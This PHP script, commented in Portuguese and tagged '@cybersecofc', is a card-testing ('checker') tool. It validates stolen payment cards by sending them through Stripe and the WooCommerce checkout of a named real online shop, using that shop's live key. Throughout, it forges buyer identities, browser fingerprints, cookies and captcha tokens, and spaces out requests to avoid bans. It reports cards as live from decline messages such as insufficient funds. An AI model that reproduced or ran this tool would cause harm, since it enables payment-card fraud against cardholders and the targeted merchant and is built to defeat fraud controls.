<?php

// Delay de 30 a 60 segundos para evitar ban (aumentado)
sleep(rand(30, 60));

if (isset($_GET['lista'])) {
    $lista = trim($_GET['lista']);
    $result = testar_cartao($lista);
    
    // Formatar exatamente como você pediu
    $response_time = isset($result['response_time']) ? round($result['response_time'], 2) . 's' : 'N/A';
    
    if ($result['status'] === 'APROVADO') {
        $status_display = 'APROVADO';
    } else {
        $status_display = 'REPROVADO';
    }
    
    // Pega a mensagem exata do checkout
    $message = $status_display . ' ' . $lista . ' = ' . $result['message'] . ' (' . $response_time . ') @cybersecofc';
    
    echo $message;
} else {
    echo 'Parâmetro "lista" não encontrado. Use: ?lista=cartao|mes|ano|cvv @cybersecofc';
}

function testar_cartao($lista) {
    $start_time = microtime(true);
    
    // Separar dados do cartão
    $dados = explode('|', $lista);
    if (count($dados) < 4) {
        return [
            'status' => 'REPROVADO',
            'message' => 'Formato inválido',
            'response_time' => microtime(true) - $start_time
        ];
    }
    
    $cartao = preg_replace('/\s+/', '', trim($dados[0]));
    $mes = str_pad(trim($dados[1]), 2, '0', STR_PAD_LEFT);
    $ano = trim($dados[2]);
    $cvv = trim($dados[3]);
    
    // Ajustar ano (se vier com 4 dígitos)
    if (strlen($ano) == 4) {
        $ano = substr($ano, -2);
    }
    
    // Validar cartão
    if (!preg_match('/^\d{13,19}$/', $cartao)) {
        return [
            'status' => 'REPROVADO',
            'message' => 'Cartão inválido',
            'response_time' => microtime(true) - $start_time
        ];
    }
    
    // Gerar dados variáveis para cada requisição
    $dados_variaveis = gerar_dados_variaveis();
    
    // Processar com as duas requisições
    $result = processar_pagamento($cartao, $mes, $ano, $cvv, $dados_variaveis);
    $result['response_time'] = microtime(true) - $start_time;
    
    return $result;
}

function gerar_dados_variaveis() {
    // Listas de nomes, emails, endereços para variar
    $primeiros_nomes = ['joao', 'maria', 'jose', 'ana', 'carlos', 'lucia', 'pedro', 'juliana', 'marcos', 'patricia'];
    $ultimos_nomes = ['silva', 'santos', 'oliveira', 'souza', 'rodrigues', 'ferreira', 'alves', 'pereira', 'lima', 'gomes'];
    $ruas = ['Rua Augusta', 'Av Paulista', 'Rua da Consolacao', 'Rua Oscar Freire', 'Av Brigadeiro', 'Rua Bela Cintra', 'Rua Haddock Lobo', 'Rua Estados Unidos', 'Rua Venezuela', 'Rua Mexico'];
    $cidades = ['Sao Paulo', 'Rio de Janeiro', 'Belo Horizonte', 'Brasilia', 'Salvador', 'Fortaleza', 'Curitiba', 'Manaus', 'Recife', 'Porto Alegre'];
    $estados = ['SP', 'RJ', 'MG', 'DF', 'BA', 'CE', 'PR', 'AM', 'PE', 'RS'];
    $paises = ['BR', 'US', 'UK', 'CA', 'AU'];
    
    // Selecionar aleatoriamente
    $primeiro_nome = $primeiros_nomes[array_rand($primeiros_nomes)];
    $ultimo_nome = $ultimos_nomes[array_rand($ultimos_nomes)];
    $nome_completo = $primeiro_nome . ' ' . $ultimo_nome;
    
    // Gerar email baseado no nome
    $email = $primeiro_nome . '.' . $ultimo_nome . rand(10, 999) . '@gmail.com';
    
    // Gerar telefone variável
    $telefone = '(11) 9' . rand(1000, 9999) . '-' . rand(1000, 9999);
    
    // Endereço variável
    $rua = $ruas[array_rand($ruas)];
    $numero = rand(10, 999);
    $cidade = $cidades[array_rand($cidades)];
    $estado = $estados[array_rand($estados)];
    $pais = $paises[array_rand($paises)];
    $cep = rand(10000, 99999);
    
    // Gerar user agent variável
    $user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
    
    return [
        'nome' => $nome_completo,
        'primeiro_nome' => $primeiro_nome,
        'ultimo_nome' => $ultimo_nome,
        'email' => $email,
        'telefone' => $telefone,
        'rua' => $rua,
        'numero' => $numero,
        'cidade' => $cidade,
        'estado' => $estado,
        'pais' => $pais,
        'cep' => $cep,
        'user_agent' => $user_agents[array_rand($user_agents)],
        'time_on_page' => rand(300000, 600000), // Aumentar tempo na página
        'guid' => gerar_guid_aleatorio(),
        'muid' => gerar_muid_aleatorio(),
        'sid' => gerar_sid_aleatorio()
    ];
}

function gerar_guid_aleatorio() {
    $formatos = ['NA', 'GA' . rand(1, 9) . '.' . rand(1, 9) . '.' . rand(100000, 999999) . '.' . time()];
    return $formatos[array_rand($formatos)];
}

function gerar_muid_aleatorio() {
    return bin2hex(random_bytes(8)) . bin2hex(random_bytes(4));
}

function gerar_sid_aleatorio() {
    return rand(100000, 999999) . '-' . rand(1000, 9999);
}

function processar_pagamento($cartao, $mes, $ano, $cvv, $dados_variaveis) {
    
    // Primeira requisição - Stripe
    $stripe_result = requisicao_stripe($cartao, $mes, $ano, $cvv, $dados_variaveis);
    
    if (isset($stripe_result['payment_method']) && !empty($stripe_result['payment_method'])) {
        // Pequeno delay entre as requisições (2-5 segundos)
        sleep(rand(2, 5));
        
        // Segunda requisição - Checkout
        $checkout_result = requisicao_checkout($stripe_result['payment_method'], $dados_variaveis);
        return $checkout_result;
    }
    
    // Se falhou na Stripe
    return [
        'status' => 'REPROVADO',
        'message' => $stripe_result['message'] ?? 'Erro na Stripe'
    ];
}

function requisicao_stripe($cartao, $mes, $ano, $cvv, $dados_variaveis) {
    $ch = curl_init();
    
    // Formatar cartão com espaços
    $cartao_formatado = substr($cartao, 0, 4) . ' ' . substr($cartao, 4, 4) . ' ' . substr($cartao, 8, 4) . ' ' . substr($cartao, 12, 4);
    
    $post_fields = http_build_query([
        'billing_details[name]' => $dados_variaveis['nome'],
        'billing_details[email]' => $dados_variaveis['email'],
        'billing_details[phone]' => $dados_variaveis['telefone'],
        'billing_details[address][city]' => $dados_variaveis['cidade'],
        'billing_details[address][country]' => $dados_variaveis['pais'],
        'billing_details[address][line1]' => $dados_variaveis['rua'] . ', ' . $dados_variaveis['numero'],
        'billing_details[address][line2]' => '',
        'billing_details[address][postal_code]' => $dados_variaveis['cep'],
        'billing_details[address][state]' => $dados_variaveis['estado'],
        'type' => 'card',
        'card[number]' => $cartao_formatado,
        'card[cvc]' => $cvv,
        'card[exp_year]' => $ano,
        'card[exp_month]' => $mes,
        'allow_redisplay' => 'unspecified',
        'pasted_fields' => 'number',
        'payment_user_agent' => 'stripe.js/' . bin2hex(random_bytes(6)) . '; stripe-js-v3/' . bin2hex(random_bytes(6)) . '; payment-element; deferred-intent',
        'referrer' => 'https://shop.schellsbrewery.com',
        'time_on_page' => $dados_variaveis['time_on_page'],
        'client_attribution_metadata[client_session_id]' => gerar_uuid(),
        'client_attribution_metadata[merchant_integration_source]' => 'elements',
        'client_attribution_metadata[merchant_integration_subtype]' => 'payment-element',
        'client_attribution_metadata[merchant_integration_version]' => rand(2020, 2024),
        'client_attribution_metadata[payment_intent_creation_flow]' => 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]' => 'merchant_specified',
        'client_attribution_metadata[elements_session_config_id]' => gerar_uuid(),
        'client_attribution_metadata[merchant_integration_additional_elements][0]' => 'payment',
        'guid' => $dados_variaveis['guid'],
        'muid' => $dados_variaveis['muid'],
        'sid' => $dados_variaveis['sid'],
        'key' => 'pk_live_51NniE7BTmi6v822wtGqsYJpvEkwvajDNmjOdP0NfcRRT6iMQv57tqp9YV8vZTGK7U49Z4ZJBOhMyijxZdtJAl85x00KmFbnt0G',
        '_stripe_version' => '2024-06-20',
        'radar_options[hcaptcha_token]' => gerar_hcaptcha_token()
    ]);
    
    $headers = [
        'Host: api.stripe.com',
        'sec-ch-ua-platform: "' . (rand(0, 1) ? 'Windows' : (rand(0, 1) ? 'macOS' : 'Linux')) . '"',
        'user-agent: ' . $dados_variaveis['user_agent'],
        'accept: application/json',
        'sec-ch-ua: "Chromium";v="' . rand(120, 124) . '", "Opera";v="' . rand(106, 110) . '", "Not_A Brand";v="99"',
        'content-type: application/x-www-form-urlencoded',
        'sec-ch-ua-mobile: ?0',
        'origin: https://js.stripe.com',
        'sec-fetch-site: same-site',
        'sec-fetch-mode: cors',
        'sec-fetch-dest: empty',
        'referer: https://js.stripe.com/',
        'accept-language: ' . (rand(0, 1) ? 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7' : 'en-US,en;q=0.9,pt;q=0.8'),
        'priority: u=1, i'
    ];
    
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $post_fields,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_ENCODING => 'gzip, deflate',
        CURLOPT_TIMEOUT => 30
    ]);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    $data = json_decode($response, true);
    
    if ($http_code == 200 && isset($data['id']) && strpos($data['id'], 'pm_') === 0) {
        return [
            'success' => true,
            'payment_method' => $data['id']
        ];
    }
    
    $error_message = 'Erro na Stripe';
    if (isset($data['error']['message'])) {
        $error_message = $data['error']['message'];
    } elseif (isset($data['error']['decline_code'])) {
        $error_message = 'Cartão ' . $data['error']['decline_code'];
    }
    
    return [
        'success' => false,
        'message' => $error_message
    ];
}

function requisicao_checkout($payment_method, $dados_variaveis) {
    $ch = curl_init();
    
    // Gerar cookies dinâmicos
    $cookies = gerar_cookies_dinamicos($dados_variaveis);
    
    $post_fields = http_build_query([
        'wc_order_attribution_source_type' => rand(0, 1) ? 'typein' : 'direct',
        'wc_order_attribution_referrer' => rand(0, 1) ? '(none)' : 'https://google.com',
        'wc_order_attribution_utm_campaign' => '(none)',
        'wc_order_attribution_utm_source' => rand(0, 1) ? '(direct)' : 'google',
        'wc_order_attribution_utm_medium' => '(none)',
        'wc_order_attribution_utm_content' => '(none)',
        'wc_order_attribution_utm_id' => '(none)',
        'wc_order_attribution_utm_term' => '(none)',
        'wc_order_attribution_utm_source_platform' => '',
        'wc_order_attribution_utm_creative_format' => '',
        'wc_order_attribution_utm_marketing_tactic' => '',
        'wc_order_attribution_session_entry' => 'https://shop.schellsbrewery.com/cart/',
        'wc_order_attribution_session_start_time' => date('Y-m-d H:i:s', strtotime('-' . rand(3, 10) . ' minutes')),
        'wc_order_attribution_session_pages' => rand(3, 8),
        'wc_order_attribution_session_count' => rand(1, 3),
        'wc_order_attribution_user_agent' => $dados_variaveis['user_agent'],
        'billing_email' => $dados_variaveis['email'],
        'billing_first_name' => $dados_variaveis['primeiro_nome'],
        'billing_last_name' => $dados_variaveis['ultimo_nome'],
        'billing_country' => $dados_variaveis['pais'],
        'billing_address_1' => $dados_variaveis['rua'],
        'billing_address_2' => 'Apto ' . rand(1, 100),
        'billing_city' => $dados_variaveis['cidade'],
        'billing_state' => $dados_variaveis['estado'],
        'billing_postcode' => $dados_variaveis['cep'],
        'billing_phone' => $dados_variaveis['telefone'],
        'account_password' => '',
        'shipping_first_name' => '',
        'shipping_last_name' => '',
        'shipping_country' => $dados_variaveis['pais'],
        'shipping_address_1' => '',
        'shipping_address_2' => '',
        'shipping_city' => '',
        'shipping_state' => '',
        'shipping_postcode' => '',
        'order_comments' => '',
        'shipping_method[0]' => 'local_pickup:2',
        'payment_method' => 'stripe',
        'wc-stripe-payment-method-upe' => '',
        'wc_stripe_selected_upe_payment_type' => '',
        'wc-stripe-is-deferred-intent' => '1',
        'terms' => 'on',
        'terms-field' => '1',
        'g-recaptcha-response' => gerar_recaptcha_token(),
        'woocommerce-process-checkout-nonce' => 'd8b55b57f6',
        '_wp_http_referer' => '/?wc-ajax=update_order_review',
        'wc-stripe-payment-method' => $payment_method
    ]);
    
    $headers = [
        'Host: shop.schellsbrewery.com',
        'Cookie: ' . $cookies,
        'sec-ch-ua-platform: "' . (rand(0, 1) ? 'Windows' : (rand(0, 1) ? 'macOS' : 'Linux')) . '"',
        'x-requested-with: XMLHttpRequest',
        'user-agent: ' . $dados_variaveis['user_agent'],
        'accept: application/json, text/javascript, */*; q=0.01',
        'sec-ch-ua: "Chromium";v="' . rand(120, 124) . '", "Opera";v="' . rand(106, 110) . '", "Not_A Brand";v="99"',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        'sec-ch-ua-mobile: ?0',
        'origin: https://shop.schellsbrewery.com',
        'sec-fetch-site: same-origin',
        'sec-fetch-mode: cors',
        'sec-fetch-dest: empty',
        'referer: https://shop.schellsbrewery.com/checkout/',
        'accept-language: ' . (rand(0, 1) ? 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7' : 'en-US,en;q=0.9,pt;q=0.8'),
        'priority: u=1, i'
    ];
    
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://shop.schellsbrewery.com/?wc-ajax=checkout',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $post_fields,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_ENCODING => 'gzip, deflate, br',
        CURLOPT_TIMEOUT => 30,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 5,
        CURLOPT_HEADER => false
    ]);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return analisar_resposta_checkout($response, $http_code);
}

function gerar_cookies_dinamicos($dados_variaveis) {
    $timestamp = time();
    $expires = $timestamp + 86400; // +1 dia
    
    // Gerar session hash aleatório
    $session_hash = bin2hex(random_bytes(16));
    
    $cookies = [
        '__cf_bm=' . bin2hex(random_bytes(16)) . '-' . $timestamp . '-1.0.1.1-' . bin2hex(random_bytes(16)),
        '_ga=GA1.1.' . rand(100000, 999999) . '.' . $timestamp,
        'sbjs_migrations=1418474375998%3D1',
        'sbjs_current_add=fd%3D' . date('Y-m-d H:i:s', strtotime('-' . rand(10, 30) . ' minutes')),
        'sbjs_first_add=fd%3D' . date('Y-m-d H:i:s', strtotime('-' . rand(60, 120) . ' minutes')),
        'sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29',
        'sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29',
        'sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29',
        'mtk_src_trk=%7B%22type%22%3A%22typein%22%7D',
        'woocommerce_items_in_cart=1',
        'wp_woocommerce_session_' . bin2hex(random_bytes(16)) . '=t_' . bin2hex(random_bytes(8)) . '%7C' . $expires . '%7C' . $timestamp,
        '_ga_' . bin2hex(random_bytes(6)) . '=GS2.1.s' . $timestamp,
        'sbjs_session=pgs%3D' . rand(3, 8) . '%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fshop.schellsbrewery.com%2Fcheckout%2F',
        'woocommerce_cart_hash=' . bin2hex(random_bytes(16))
    ];
    
    return implode('; ', $cookies);
}

function analisar_resposta_checkout($response, $http_code) {
    $data = json_decode($response, true);
    
    // Lista de mensagens que consideramos APROVADO
    $live_messages = [
        "Your card's security code is incorrect.",
        "Your card has insufficient funds.",
        "The postal code is incorrect."
    ];
    
    // Extrair mensagem de erro exatamente como vem no checkout
    $error_message = 'Your card was declined.';
    
    if (isset($data['messages'])) {
        // Procurar a mensagem dentro das tags <li>
        if (preg_match('/<li>(.*?)<\/li>/s', $data['messages'], $matches)) {
            $error_message = trim(strip_tags($matches[1]));
        } else {
            // Se não encontrar li, tenta pegar o texto completo
            $error_message = trim(strip_tags($data['messages']));
        }
    } elseif (isset($data['message'])) {
        $error_message = $data['message'];
    } elseif (isset($data['error'])) {
        if (is_string($data['error'])) {
            $error_message = $data['error'];
        } elseif (isset($data['error']['message'])) {
            $error_message = $data['error']['message'];
        }
    }
    
    // Limpar a mensagem (remover espaços extras, quebras de linha)
    $error_message = preg_replace('/\s+/', ' ', $error_message);
    $error_message = trim($error_message);
    
    // Verificar se a mensagem está na lista de live
    if (in_array($error_message, $live_messages)) {
        return [
            'status' => 'APROVADO',
            'message' => $error_message
        ];
    }
    
    // Verificar se é sucesso (aprovado) pelo result success
    if ($http_code == 200 && isset($data['result']) && $data['result'] === 'success') {
        return [
            'status' => 'APROVADO',
            'message' => 'Payment processed successfully'
        ];
    }
    
    // Qualquer outra mensagem = REPROVADO
    return [
        'status' => 'REPROVADO',
        'message' => $error_message
    ];
}

function gerar_uuid() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

function gerar_hcaptcha_token() {
    // Gerar token hCaptcha dinâmico
    $header = base64_encode('{"typ":"JWT","alg":"HS256"}');
    $payload = base64_encode('{"pd":0,"exp":' . (time() + 3600) . ',"cdata":"' . bin2hex(random_bytes(50)) . '"}');
    $signature = bin2hex(random_bytes(43));
    
    return 'P1_' . $header . '.' . $payload . '.' . $signature;
}

function gerar_recaptcha_token() {
    // Gerar token reCAPTCHA dinâmico
    return '0cAFcWeA' . bin2hex(random_bytes(100)) . '-' . bin2hex(random_bytes(50));
}

?>
